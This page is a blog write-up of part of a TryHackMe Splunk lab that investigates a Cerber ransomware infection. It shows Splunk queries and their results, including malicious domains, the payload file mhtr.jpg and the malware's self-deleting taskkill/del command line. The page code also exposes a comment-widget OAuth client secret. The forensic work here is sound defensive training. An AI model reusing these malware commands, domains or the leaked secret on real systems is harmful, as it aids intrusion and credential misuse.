<td>16/08/24 17:15:18.000</td>
<td>08/24/2016 11:15:18.043 event_status=”(0)The operation completed successfully.” pid=3496 process_image=”c:\Windows\explorer.exe” registry_type=”CreateKey” key_path=”HKU\s-1-5-21-67332772-3493699611-3403467266-1109\software\microsoft\windows\currentversion\explorer\mountpoints2##192.168.250.20#fileshare” data_type=”REG_NONE” data=””</td>
</tr>
</tbody></table>
<p>答案是192.168.250.20</p>
<h2 id="6-6-What-was-the-first-suspicious-domain-visited-by-we8105desk-on-24AUG2016"><a href="#6-6-What-was-the-first-suspicious-domain-visited-by-we8105desk-on-24AUG2016" class="headerlink" title="6.6 What was the first suspicious domain visited by we8105desk on 24AUG2016?"></a>6.6 What was the first suspicious domain visited by we8105desk on 24AUG2016?</h2><p>we8105desk在2016年8月24日访问的第一个可疑域是什么？</p>
<p>就是DNS记录，排除掉可信域：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 src_ip&#x3D;&quot;192.168.250.100&quot; sourcetype&#x3D;stream:dns record_type&#x3D;A NOT (query&#123;&#125;&#x3D;&quot;*microsoft.com&quot; OR query&#123;&#125;&#x3D;&quot;wpad&quot; OR query&#123;&#125;&#x3D;&quot;*.waynecorpinc.local&quot; OR query&#123;&#125;&#x3D;&quot;isatap&quot; OR query&#123;&#125;&#x3D;&quot;*bing.com&quot; OR query&#123;&#125;&#x3D;&quot;*windows.com&quot; OR query&#123;&#125;&#x3D;&quot;*msftncsi.com&quot;)</span><br><span class="line">| table _time, query&#123;&#125;</span><br><span class="line">| sort by _time</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>_time</th>
<th>query{}</th>
</tr>
</thead>
<tbody><tr>
<td>2016/08/24 16:48:12.267</td>
<td>solidaritedeproximite.orgsolidaritedeproximite.org</td>
</tr>
<tr>
<td>2016/08/24 16:49:24.308</td>
<td>ipinfo.ioipinfo.io</td>
</tr>
<tr>
<td>2016/08/24 17:15:12.668</td>
<td>cerberhhyed5frqa.xmfir0.wincerberhhyed5frqa.xmfir0.win</td>
</tr>
</tbody></table>
<p>Answer: <code>solidaritedeproximite.org</code></p>
<h2 id="6-7-The-malware-downloads-a-file-that-contains-the-Cerber-ransomware-cryptor-code-What-is-the-name-of-that-file"><a href="#6-7-The-malware-downloads-a-file-that-contains-the-Cerber-ransomware-cryptor-code-What-is-the-name-of-that-file" class="headerlink" title="6.7 The malware downloads a file that contains the Cerber ransomware cryptor code. What is the name of that file?"></a>6.7 The malware downloads a file that contains the Cerber ransomware cryptor code. What is the name of that file?</h2><p>恶意软件下载包含Cerber勒索软件代码的文件。 该文件的名称是什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 src_ip&#x3D;&quot;192.168.250.100&quot; sourcetype&#x3D;suricata http.hostname&#x3D;solidaritedeproximite.org </span><br><span class="line">|  table _time, http.http_method, http.hostname, http.url</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>_time</th>
<th>http.http_method</th>
<th>http.hostname</th>
<th>http.url</th>
</tr>
</thead>
<tbody><tr>
<td>2016/08/24 16:48:13.492</td>
<td>GET</td>
<td>solidaritedeproximite.org</td>
<td>/mhtr.jpg</td>
</tr>
</tbody></table>
<p>Answer: <code>mhtr.jpg</code></p>
<h2 id="6-8-What-is-the-parent-process-ID-of-121214-tmp"><a href="#6-8-What-is-the-parent-process-ID-of-121214-tmp" class="headerlink" title="6.8 What is the parent process ID of 121214.tmp?"></a>6.8 What is the parent process ID of 121214.tmp?</h2><p>121214.tmp的父进程ID是什么？</p>
<table>
<thead>
<tr>
<th>_time</th>
<th>CommandLine</th>
<th>ProcessId</th>
<th>ParentCommandLine</th>
<th>ParentProcessId</th>
</tr>
</thead>
<tbody><tr>
<td>2016/08/24 16:48:21</td>
<td>“C:\Windows\System32\cmd.exe” /C START “” “C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp”</td>
<td>1476</td>
<td>“C:\Windows\System32\WScript.exe” “C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\20429.vbs”</td>
<td>3968</td>
</tr>
<tr>
<td>2016/08/24 16:48:21</td>
<td>“C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp”</td>
<td>2948</td>
<td>“C:\Windows\System32\cmd.exe” /C START “” “C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp”</td>
<td>1476</td>
</tr>
<tr>
<td>2016/08/24 16:48:29</td>
<td>“C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp”</td>
<td>3828</td>
<td>“C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp”</td>
<td>2948</td>
</tr>
<tr>
<td>2016/08/24 16:48:41</td>
<td>“C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming{35ACA89F-933F-6A5D-2776-A3589FB99832}\osk.exe”</td>
<td>3836</td>
<td>“C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp”</td>
<td>3828</td>
</tr>
<tr>
<td>2016/08/24 16:48:41</td>
<td>/d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp” &gt; NUL</td>
<td>1280</td>
<td>“C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp”</td>
<td>3828</td>
</tr>
<tr>
<td>2016/08/24 16:48:41</td>
<td>taskkill  /t /f /im “121214.tmp”</td>
<td>1684</td>
<td>/d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp” &gt; NUL</td>
<td>1280</td>
</tr>
<tr>
<td>2016/08/24 16:48:42</td>
<td>ping  -n 1 127.0.0.1</td>
<td>556</td>
<td>/d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp” &gt; NUL</td>
<td>1280</td>
</tr>
</tbody></table>
<p>Answer: <code>3968</code></p>
<h2 id="6-9-Amongst-the-Suricata-signatures-that-detected-the-Cerber-malware-which-signature-ID-alerted-the-fewest-number-of-times"><a href="#6-9-Amongst-the-Suricata-signatures-that-detected-the-Cerber-malware-which-signature-ID-alerted-the-fewest-number-of-times" class="headerlink" title="6.9 Amongst the Suricata signatures that detected the Cerber malware, which signature ID alerted the fewest number of times?"></a>6.9 Amongst the Suricata signatures that detected the Cerber malware, which signature ID alerted the fewest number of times?</h2><p>在检测到Cerber恶意软件的Suricata签名中，哪个签名ID发出警报的次数最少？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 cerber sourcetype&#x3D;suricata </span><br><span class="line">| stats count by alert.signature, alert.signature_id </span><br><span class="line">| sort -count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>alert.signature</th>
<th>alert.signature_id</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>ETPRO TROJAN Ransomware/Cerber Checkin Error ICMP Response</td>
<td>2816764</td>
<td>2</td>
</tr>
<tr>
<td>ETPRO TROJAN Ransomware/Cerber Onion Domain Lookup</td>
<td>2820156</td>
<td>2</td>
</tr>
<tr>
<td>ETPRO TROJAN Ransomware/Cerber Checkin 2</td>
<td>2816763</td>
<td>1</td>
</tr>
</tbody></table>
<p>Answer: <code>2816763</code></p>
<h2 id="6-10-The-Cerber-ransomware-encrypts-files-located-in-Bob-Smith’s-Windows-profile-How-many-txt-files-does-it-encrypt"><a href="#6-10-The-Cerber-ransomware-encrypts-files-located-in-Bob-Smith’s-Windows-profile-How-many-txt-files-does-it-encrypt" class="headerlink" title="6.10 The Cerber ransomware encrypts files located in Bob Smith’s Windows profile. How many .txt files does it encrypt?"></a>6.10 The Cerber ransomware encrypts files located in Bob Smith’s Windows profile. How many .txt files does it encrypt?</h2><p>Cerber勒索软件对Bob Smith的Windows配置文件中的文件进行加密。 它加密多少个.txt文件？</p>
<p>首先运行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 host&#x3D;we8105desk sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot; *.txt </span><br><span class="line">| stats count by TargetFilename</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>TargetFilename</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>C:\Sysmon._Eula.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Sysmon\AuditPol_AFTER_WE8105DESK.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Sysmon\AuditPol_BEFORE_WE8105DESK.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Sysmon\Eula.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\2010\Office 2010 Pro\Key.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\2010\Project 2010\Key.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\2010\Visio 2010\visio 2010.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset._Help.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset._readme.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Help.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Lang\CHIP\ARA._license.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Lang\CHIP\ARA\license.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Lang\CHIP\ARB._license.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Lang\CHIP\ARB\license.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Lang\CHIP\CHS._license.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Lang\CHIP\CHS\license.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Lang\CHIP\CHT._license.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Lang\CHIP\CHT\license.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Lang\CHIP\CSY._license.txt</td>
<td>1</td>
</tr>
<tr>
<td>C:\Users\bob.smith.WAYNECORPINC\Desktop\BootCamp4for7\Drivers\Intel\Chipset\Lang\CHIP\CSY\license.txt</td>
<td>1</td>
</tr>
</tbody></table>
<p>我们看到勒索软件会在多个位置加密文件。 要关注Bob Smith的Windows配置文件，请过滤Bob Smith的主文件夹中的* .txt文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 host&#x3D;we8105desk sourcetype&#x3D;&quot;XmlWinEventLog:Microsoft-Windows-Sysmon&#x2F;Operational&quot; TargetFilename&#x3D;&quot;C:\\Users\\bob.smith.WAYNECORPINC\\*.txt&quot; </span><br><span class="line">| stats dc(TargetFilename)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>dc(TargetFilename)</th>
</tr>
</thead>
<tbody><tr>
<td>406</td>
</tr>
</tbody></table>
<p>Answer: <code>406</code></p>
<h2 id="6-11-How-many-distinct-PDFs-did-the-ransomware-encrypt-on-the-remote-file-server"><a href="#6-11-How-many-distinct-PDFs-did-the-ransomware-encrypt-on-the-remote-file-server" class="headerlink" title="6.11 How many distinct PDFs did the ransomware encrypt on the remote file server?"></a>6.11 How many distinct PDFs did the ransomware encrypt on the remote file server?</h2><p>勒索软件在远程文件服务器上加密了多少个不同的PDF？</p>
<p>首先需要确认sourcetype，pdf文件应该是wineventlog：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 *.pdf </span><br><span class="line">| stats count by sourcetype </span><br><span class="line">| sort -count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>sourcetype</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>wineventlog</td>
<td>527</td>
</tr>
<tr>
<td>stream:smb</td>
<td>283</td>
</tr>
<tr>
<td>XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</td>
<td>50</td>
</tr>
<tr>
<td>WinRegistry</td>
<td>3</td>
</tr>
<tr>
<td>stream:http</td>
<td>1</td>
</tr>
</tbody></table>
<p>然后确定目标：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 *.pdf sourcetype&#x3D;wineventlog </span><br><span class="line">|  stats count by dest </span><br><span class="line">|  sort -count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>dest</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>we9041srv.waynecorpinc.local</td>
<td>526</td>
</tr>
<tr>
<td>we8105desk.waynecorpinc.local</td>
<td>1</td>
</tr>
</tbody></table>
<p>我们需要看的应该是we9041srv.waynecorpinc.local</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 *.pdf sourcetype&#x3D;wineventlog   dest&#x3D;&quot;we9041srv.waynecorpinc.local&quot; </span><br><span class="line">|  stats count by Source_Address </span><br><span class="line">|  sort -count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Source_Address</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.250.100</td>
<td>525</td>
</tr>
<tr>
<td>192.168.2.50</td>
<td>1</td>
</tr>
</tbody></table>
<p>然后过滤我们失陷机对其的访问操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;wineventlog dest&#x3D;&quot;we9041srv.waynecorpinc.local&quot; Source_Address&#x3D;&quot;192.168.250.100&quot; Relative_Target_Name&#x3D;&quot;*.pdf&quot;</span><br><span class="line">| stats dc(Relative_Target_Name)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>dc(Relative_Target_Name)</th>
</tr>
</thead>
<tbody><tr>
<td>257</td>
</tr>
</tbody></table>
<p>Answer: <code>257</code></p>
<h2 id="6-12-What-fully-qualified-domain-name-FQDN-does-the-Cerber-ransomware-attempt-to-direct-the-user-to-at-the-end-of-its-encryption-phase"><a href="#6-12-What-fully-qualified-domain-name-FQDN-does-the-Cerber-ransomware-attempt-to-direct-the-user-to-at-the-end-of-its-encryption-phase" class="headerlink" title="6.12  What fully qualified domain name (FQDN) does the Cerber ransomware attempt to direct the user to at the end of its encryption phase?"></a>6.12  What fully qualified domain name (FQDN) does the Cerber ransomware attempt to direct the user to at the end of its encryption phase?</h2><p>Cerber勒索软件尝试在加密阶段结束时将用户引导到哪个完全限定域名（FQDN）？</p>
<p>这个其实在6.6就已经得到了答案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 src_ip&#x3D;&quot;192.168.250.100&quot; sourcetype&#x3D;stream:dns record_type&#x3D;A NOT (query&#123;&#125;&#x3D;&quot;*microsoft.com&quot; OR query&#123;&#125;&#x3D;&quot;wpad&quot; OR query&#123;&#125;&#x3D;&quot;*.waynecorpinc.local&quot; OR query&#123;&#125;&#x3D;&quot;isatap&quot; OR query&#123;&#125;&#x3D;&quot;*bing.com&quot; OR query&#123;&#125;&#x3D;&quot;*windows.com&quot; OR query&#123;&#125;&#x3D;&quot;*msftncsi.com&quot;)</span><br><span class="line">| table _time, query&#123;&#125;</span><br><span class="line">| sort by _time</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>_time</th>
<th>query{}</th>
</tr>
</thead>
<tbody><tr>
<td>2016/08/24 16:48:12.267</td>
<td>solidaritedeproximite.orgsolidaritedeproximite.org</td>
</tr>
<tr>
<td>2016/08/24 16:49:24.308</td>
<td>ipinfo.ioipinfo.io</td>
</tr>
<tr>
<td>2016/08/24 17:15:12.668</td>
<td>cerberhhyed5frqa.xmfir0.wincerberhhyed5frqa.xmfir0.win</td>
</tr>
</tbody></table>
<p>加密完成后，用户会被引导到cerberhhyed5frqa.xmfir0.win</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整个流程就是某个用户插入一个USB，word模板dotm文件，产生了可疑进程，下载执行勒索软件，加密文件，加密完成后加密完成后将用户引导至攻击者域名。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020073001.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020073002.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://www.aldeid.com/wiki/TryHackMe-BP-Splunk" target="_blank" rel="noopener">https://www.aldeid.com/wiki/TryHackMe-BP-Splunk</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2020-07-30T06:42:09.151Z" itemprop="dateUpdated">2020-07-30 14:42:09</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/TryHackMe/" rel="tag">TryHackMe</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/&title=《BP-Splunk-TryHackMe》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/&title=《BP-Splunk-TryHackMe》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《BP-Splunk-TryHackMe》 — 喵喵喵喵&url=https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2020/08/03/Buff-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Buff - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2020/07/22/SneakyMailer-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">SneakyMailer - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2023</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/&title=《BP-Splunk-TryHackMe》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/&title=《BP-Splunk-TryHackMe》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《BP-Splunk-TryHackMe》 — 喵喵喵喵&url=https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/07/30/BP-Splunk-TryHackMe/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJ0lEQVR42u3aQW7EMAgF0Nz/0um2UjWZDySVYj+vqjYd+2XBYOA44nX+Wp9+kzz/96/5Z96wMDAwXss4L1d+rOqLuN49PxsGBsY+jE8bJ8/cFTSvX9aXM2NgYGAEwbf6/HXYxcDAwJgzJrxeAoqBgYGRbHCd0lWf7BXmbriLY2BgvJCRXy///+dH+hsYGBivYpzFVb1w9oJj+VQYGBhLM+5qQN7bTmieBwMDYwNGtVjfG5LIP7laEMTAwFiV0dsgBycheNIkwMDA2IfxxABE9RXkyejHbwwMDIxFGdVWYvVi2QvcvYQVAwNjVcbkmpoHwcklNtodAwNjA0aUcrWCbB7EkxcUXWIxMDCWY0wSuF6Z7K5SXdTCxMDAWIhRHXe4PkqeJkZF/+oJMTAwFmU80R6YtBOqJAwMjLUZZ7AmQbZa6E8uzF9mRjAwMJZjVMcaesW4o7h6/4WBgbEPIy+iVV9E3qrMU0kMDIx9GNdpXFLo7/EmbYZo8AIDA2MhRj4M0QyCrZZkOfhiYGBswKgCJgOpvbAb9TcwMDCWZlTL9/kY2WSwo1CYw8DAWJRxFte8Sp83JgvJIgYGxtKMeZuzl0ROnq+OaGBgYKzBmI+F9a64k8QRAwNjT0ZexJ+kd9UyXAGJgYGBUSzu55fS6jDZkb9LDAyMjRl50zEvmSV7PfK9gYGB8SpG9ViTQJl/8iN3cQwMjBcyytMZxcPN077bGpkYGBjvY/wAfR9qmLm9JxEAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
